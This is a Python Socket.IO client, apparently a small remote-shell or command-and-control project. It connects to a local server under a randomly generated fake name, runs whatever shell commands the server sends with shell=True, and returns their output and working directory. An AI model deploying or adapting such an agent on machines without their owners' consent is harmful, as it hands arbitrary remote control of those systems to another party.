
import subprocess
import datetime
import os
import sys
import json

import socketio
from faker import Faker


STATUS_CODE = {
    '0': 'SUCCESS',
    '1': 'GENERAL ERROR',
    '2': 'MISUSE OF SHELL BUILTINS',
    '126': 'COMMAND INVOKED CANT EXECUTE',
    '127': 'COMMAND NOT FOUND',
    '128': 'INVALID ARGUMENT TO EXIT',
    '128+n': 'FATAL ERROR SIGNAL N',
    '130': 'TERMINATION BY CTRL+C',
    '255': 'EXIT STATUS OUT OF RANGE'
}


fake = Faker()

# Creating a Client Instance
clientsio = socketio.Client()
start_timer = True

payload = {
    'client_ID': fake.name(),
    'connection_timestamp': str(datetime.datetime.now())[:-7],
    'working_directory': os.getcwd(),
    'latest_command': '',
}


def execute_command(command):

    execution_timestamp = str(datetime.datetime.now())[:-7]
    working_directory = os.getcwd()

    # Making cd work
    command = command.lstrip()
    if 'cd' in command[:2]:

        relative_path = command[2:].strip()
        path_change_error = 'No such file or directory'
        path_change_message = ''
        path_change_return_code = 126

        if os.path.exists(relative_path):
            os.chdir(relative_path)
            payload['working_directory'] = os.getcwd()
            path_change_error = ''
            path_change_message = 'Working directory changed successfully.'
            path_change_return_code = 0

        return json.dumps({
            'stderr': path_change_error,
            'stdout': path_change_message,
            'return_code': path_change_return_code,
            'return_code_meaning': STATUS_CODE[str(path_change_return_code)],
            'session_ID': payload['client_Session_ID'],
            'execution_timestamp': execution_timestamp,
            'working_directory': working_directory,
            'latest_command': command,
        }
        )

    os.chdir(payload['working_directory'])

    proc = subprocess.Popen(command,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True
                            )
    stdout, stderr = proc.communicate()
    return_code = proc.returncode

    if len(stdout) == 0:
        stdout = ""
    else:
        stdout = stdout.decode('utf-8')

    if len(stderr) == 0:
        stderr = ""
    else:
        stderr = stderr.decode('utf-8')

    client_response = {
        'stderr': stderr,
        'stdout': stdout,
        'return_code': return_code,
        'return_code_meaning': STATUS_CODE[str(return_code)],
        'session_ID': payload['client_Session_ID'],
        'execution_timestamp': execution_timestamp,
        'working_directory': payload['working_directory'],
        'latest_command': command,
    }

    print(client_response)

    return json.dumps(client_response)

# Defining Event Handlers
@clientsio.event
def message(data):
    print('I received a message !')


@clientsio.event
def connect():
    print("I'm connected!")
    payload['client_Session_ID'] = clientsio.sid
    clientsio.emit('first_handshake', payload)


@clientsio.event
def connect_error():
    print("The connection failed!")


@clientsio.event
def disconnect():
    print("I'm disconnected!")


@clientsio.on('send_command_to_client')
def receive_command(json):
    print(f'Received commands : {str(json)}')


@clientsio.on('server_commands', namespace='/command')
def handle_command_from_server(command):

    output = execute_command(command)
    output = f'{output}'
    clientsio.emit('output_from_client', output)


@clientsio.on('client_please_report')
def register_to_server_for_realtime_attendance(message):
    clientsio.emit('realtime_attendance', payload)


if __name__ == "__main__":
    clientsio.connect('http://localhost:5000')
    print(payload['client_ID'])
    clientsio.wait()
